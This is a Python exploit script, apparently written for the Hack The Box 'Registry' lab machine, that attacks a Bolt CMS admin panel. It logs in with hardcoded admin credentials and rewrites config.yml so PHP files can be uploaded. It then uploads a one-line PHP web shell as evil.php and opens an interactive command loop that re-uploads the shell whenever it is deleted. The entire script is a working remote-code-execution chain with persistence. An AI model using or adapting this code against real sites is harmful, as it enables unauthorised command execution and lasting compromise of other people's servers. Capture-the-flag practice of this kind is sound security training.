import requests
from bs4 import BeautifulSoup
from io import BytesIO

CONFIG_YML = """
database:
    driver: sqlite
    databasename: bolt
sitename: A sample site
payoff: The amazing payoff goes here
theme: base-2018
locale: en_GB
maintenance_mode: false
maintenance_template: maintenance_default.twig
cron_hour: 3
homepage: homepage/1
homepage_template: index.twig
notfound: [ not-found.twig, block/404-not-found ]
record_template: record.twig
listing_template: listing.twig
listing_records: 6
listing_sort: datepublish DESC
taxonomy_sort: DESC
search_results_template: search.twig
search_results_records: 10
add_jquery: false
recordsperpage: 10
caching:
    config: true
    templates: true
    request: false
    duration: 10
    authenticated: false
    thumbnails: true
    translations: true
changelog:
    enabled: false
thumbnails:
    default_thumbnail: [ 160, 120 ]
    default_image: [ 1000, 750 ]
    quality: 80
    cropping: crop
    notfound_image: bolt_assets://img/default_notfound.png
    error_image: bolt_assets://img/default_error.png
    save_files: false
    allow_upscale: false
    exif_orientation: true
    only_aliases: false
htmlcleaner:
    allowed_tags: [ div, span, p, br, hr, s, u, strong, em, i, b, li, ul, ol, mark, blockquote, pre, code, tt, h1, h2, h3, h4, h5, h6, dd, dl, dt, table, tbody, thead, tfoot, th, td, tr, a, img, address, abbr, iframe, caption, sub, sup, figure, figcaption ]
    allowed_attributes: [ id, class, style, name, value, href, src, alt, title, width, height, frameborder, allowfullscreen, scrolling, target, colspan, rowspan ]
accept_file_types: [php, twig, html, js, css, scss, gif, jpg, jpeg, png, ico, zip, tgz, txt, md, doc, docx, pdf, epub, xls, xlsx, ppt, pptx, mp3, ogg, wav, m4a, mp4, m4v, ogv, wmv, avi, webm, svg]
debug: true
debug_show_loggedoff: false
debug_permission_audit_mode: false
debug_error_level: -1
debug_error_use_symfony: false
debug_trace_argument_limit: 4
debuglog:
    enabled: false
    filename: bolt-debug.log
    level: DEBUG
wysiwyg:
    images: false
    styles: false
    anchor: false
    tables: false
    fontcolor: false
    align: false
    subsuper: false
    embed: false
    underline: false
    ruler: false
    strike: false
    blockquote: false
    codesnippet: false
    specialchar: false
    clipboard: false
    copypaste: false
    abbr: true
    ck:
        autoParagraph: true
        disableNativeSpellChecker: true
        allowNbsp: false
liveeditor: false
cookies_use_remoteaddr: true
cookies_use_browseragent: false
cookies_use_httphost: true
cookies_lifetime: 1209600
cookies_domain:
hash_strength: 10
compatibility:
    template_view: true
    setcontent_legacy: true
"""
LOGIN_PAGE_URL = 'http://registry.htb/bolt/bolt/login'
FILE_EDIT_URL = 'http://registry.htb/bolt/bolt/file/edit/config/config.yml'
FILE_UPLOAD_URL = 'http://registry.htb/bolt/bolt/files'
PHP_WEBSHELL = """<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>"""

def get_token(response, token_name):
    soup = BeautifulSoup(response.content, 'html.parser')
    token_input = soup.find('input', {'name': token_name})
    return token_input['value'] if token_input else None


def login(session, url, username, password):
    response = session.get(url)
    token_value = get_token(response, 'user_login[_token]')
    if not token_value:
        print("Failed to retrieve the token.")
        return False

    payload = {
        'user_login[username]': username,
        'user_login[password]': password,
        'user_login[_token]': token_value,  
        'user_login[login]': ''
    }

    response = session.post(url, data=payload)
    return 'Dashboard' in response.text


def edit_config(session, url, config_content):
    response = session.get(url)
    token_value = get_token(response, 'file_edit[_token]')
    if not token_value:
        print("Failed to retrieve the file token.")
        return False

    payload = {
        'file_edit[_token]': token_value,
        'file_edit[contents]': config_content,
        'file_edit[save]': ''
    }

    response = session.post(url, data=payload)
    return response.json().get('ok', False)


def upload_file(session, url, file_content, file_name='evil.php'):
    response = session.get(url)
    token_value = get_token(response, 'file_upload[_token]')
    if not token_value:
        print("Failed to retrieve the file token.")
        return False

    file_io = BytesIO(file_content.encode('utf-8'))
    files = {
        'file_upload[select][]': (file_name, file_io, 'application/x-php'),
    }
    data = {'file_upload[_token]': token_value}
    response = session.post(url, files=files, data=data)
    return response.status_code == 200


def execute_command(session, url, command):
    response = session.get(url + f'?cmd={command}')
    
    if response.status_code != 200:
        print('[~] Shell has been deleted and config file has been changed. Changing config and uploading shell again...')
        edit_config(session, FILE_EDIT_URL, CONFIG_YML)
        upload_file(session, FILE_UPLOAD_URL, PHP_WEBSHELL)
        response = session.get(url + f'?cmd={command}')

    return response.text


def main():
    session = requests.Session()

    if not login(session, LOGIN_PAGE_URL, 'admin', 'strawberry'):
        print('Login failed.')
        return

    if not edit_config(session, FILE_EDIT_URL, CONFIG_YML):
        print('Failed to change config.')
        return

    if not upload_file(session, FILE_UPLOAD_URL, PHP_WEBSHELL):
        print('Failed to upload file.')
        return

    while True:
        cmd = input('shell> ')
        if cmd.lower() == 'exit':
            break
        output = execute_command(session, 'http://registry.htb/bolt/files/evil.php', cmd)
        print(output)


if __name__ == '__main__':
    main()
